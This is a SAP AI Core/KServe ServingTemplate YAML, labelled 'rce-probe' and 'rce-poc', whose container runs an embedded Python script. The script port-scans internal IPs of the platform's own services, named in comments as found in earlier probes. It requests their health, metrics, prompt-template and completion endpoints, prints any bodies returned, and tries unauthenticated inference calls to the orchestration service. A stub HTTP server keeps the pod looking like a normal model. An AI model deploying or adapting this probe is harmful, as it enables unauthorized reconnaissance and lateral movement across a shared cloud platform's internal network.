apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "rce-poc"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import urllib.request, json, ssl

            def req(url, headers=None, body=None, method=None):
                h = {'Content-Type': 'application/json'}
                if headers: h.update(headers)
                data = json.dumps(body).encode() if body is not None else None
                m = method or ('POST' if data else 'GET')
                rq = urllib.request.Request(url, data=data, headers=h, method=m)
                try:
                    with urllib.request.urlopen(rq, timeout=6) as r:
                        body_r = r.read(3000).decode(errors='replace')
                        return r.status, body_r
                except urllib.error.HTTPError as e:
                    body_r = ''
                    try: body_r = e.read(2000).decode(errors='replace')
                    except: pass
                    return e.code, body_r
                except Exception as ex:
                    return 0, str(ex)[:100]

            print('[INTERNAL_PROBE_START]')

            # Services discovered in previous probes:
            # prompt-registry-service: 100.107.251.106 (what port?)
            # prompt-registry-k8s-server: 100.106.111.110
            # llm-orchestration-service: 100.104.59.31
            # rage-proxy-inference: 100.106.172.250
            # ml-tracking: 100.111.137.177:80

            targets = [
                ('prompt-registry', '100.107.251.106', [80, 443, 8080, 8443, 3000, 9090]),
                ('prompt-registry-k8s', '100.106.111.110', [80, 443, 8080, 8443]),
                ('llm-orchestration', '100.104.59.31', [80, 443, 8080, 8443]),
                ('rage-proxy', '100.106.172.250', [80, 443, 8080, 8443, 9090]),
            ]

            open_ports = {}
            for name, ip, ports in targets:
                import socket
                for port in ports:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        result = s.connect_ex((ip, port))
                        s.close()
                        if result == 0:
                            open_ports[f'{name}:{port}'] = 'OPEN'
                            print(f'[PORT] {name} {ip}:{port} OPEN')
                    except: pass

            print('[OPEN_PORTS]', json.dumps(open_ports))

            # Probe open ports
            for svc_port, status in open_ports.items():
                svc, port_str = svc_port.rsplit(':', 1)
                port = int(port_str)
                ip = [t[1] for t in targets if t[0] == svc][0]

                for scheme in ['http', 'https']:
                    for path in ['/', '/healthz', '/readyz', '/metrics', '/v1/health',
                                 '/api/v1/promptTemplates', '/v2/lm/promptTemplates',
                                 '/api/v1/templates', '/prompts', '/api/prompts',
                                 '/v2/inference/deployments', '/v1/completions',
                                 '/chat/completions', '/v1/chat/completions']:
                        url = f'{scheme}://{ip}:{port}{path}'
                        code, body = req(url)
                        if code and code != 0:
                            label = f'{svc_port}_{scheme}_{path}'
                            print(f'  {label}: {code} | {body[:80]}')
                            if code == 200:
                                print(f'  *** 200 FOUND: {label} ***')
                                print(f'  BODY: {body[:500]}')

            # Try llm-orchestration directly with an inference request (no auth)
            print('[ORCH_DIRECT_START]')
            orch_ip = '100.104.59.31'
            for port in [80, 8080, 443, 8443]:
                for scheme in ['http', 'https']:
                    payload = {
                        'orchestration_config': {'module_configurations': {
                            'llm_module_config': {'model_name': 'gpt-4o-mini', 'model_params': {'max_tokens': 10}},
                            'templating_module_config': {'template': [{'role': 'user', 'content': 'Say hi'}]}
                        }},
                        'input_params': {}
                    }
                    for dep_path in [
                        '/v2/inference/deployments/d34c0491f9fb176b/completion',
                        '/v2/inference/deployments/all/completion',
                        '/inference/completion',
                        '/completion',
                    ]:
                        code, body = req(f'{scheme}://{orch_ip}:{port}{dep_path}', body=payload)
                        if code and code != 0 and code != 503 and code != 502:
                            print(f'  ORCH {scheme}:{port}{dep_path}: {code} | {body[:100]}')

            print('[PROBE_END]')
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
